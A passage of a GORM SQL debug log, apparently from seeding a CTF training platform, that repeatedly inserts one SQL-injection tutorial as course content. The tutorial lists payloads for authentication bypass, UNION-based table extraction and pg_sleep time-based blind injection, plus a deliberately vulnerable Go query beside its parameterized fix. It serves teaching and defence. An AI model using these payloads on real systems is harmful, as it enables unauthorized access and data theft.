* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,61) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.429ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.058ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.86','2025-06-09 14:07:54.86',NULL,'cyber security and zddbn','hlpUnQdELGJhbTeNYGSoJwfnxkrYyPRUegINUHCDTPghLWJlokmiBNCxhrcFDieyJPamTfhHyVHXSwLpdYsefvsztigZdkjKxURy',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.626ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 62 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.038ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.868','2025-06-09 14:07:54.868',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,62) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.611ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.470ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.877','2025-06-09 14:07:54.877',NULL,'cyber security and khtcc','IHfDnvTOlepuwqnQsHEpgxIsudvaZzFRssrgrBEOYYVzuFfZVerZeDDWnmrUAdzzWcOHTNAMAkxUWxnJanTarHiwxTsHYKLZLkbS',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.531ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 63 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.440ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.886','2025-06-09 14:07:54.886',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,63) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.561ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.897','2025-06-09 14:07:54.897',NULL,'cyber security and alzxt','MyUVRXIHYxIQBnoalVJwQYKHkmTGLMRCBJDuRAbUSEqneUNgPJlDrYJRQtaDLBAgyVRUQTRQVqnRZyehDyDFJQobuWMOQHibTdWR',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.585ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.606ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 64 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[13.098ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.907','2025-06-09 14:07:54.907',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,64) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.492ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.521ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.917','2025-06-09 14:07:54.917',NULL,'cyber security and euvfs','cQAiXscQWSMEXczCTxUvRHfOkQuDFIXBclVtLCYdSEdekldzDLwiIuookHCimZIhoGsrpuIyQWhbearNXZlLTyDtWubZtYUuIvPY',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.512ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 65 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.612ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.925','2025-06-09 14:07:54.925',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,65) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.726ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.934','2025-06-09 14:07:54.934',NULL,'cyber security and uofga','LYhdcZHSmmxrKHcOpTKiNpiWeNkkwDLZlncTMOYPBRExReRZTBDUwpIfKjOlezqLDxoaRmiBvFvURzeFjoXpzqRcowfSkkUAhNmV',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.584ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 66 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.983ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.945','2025-06-09 14:07:54.945',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

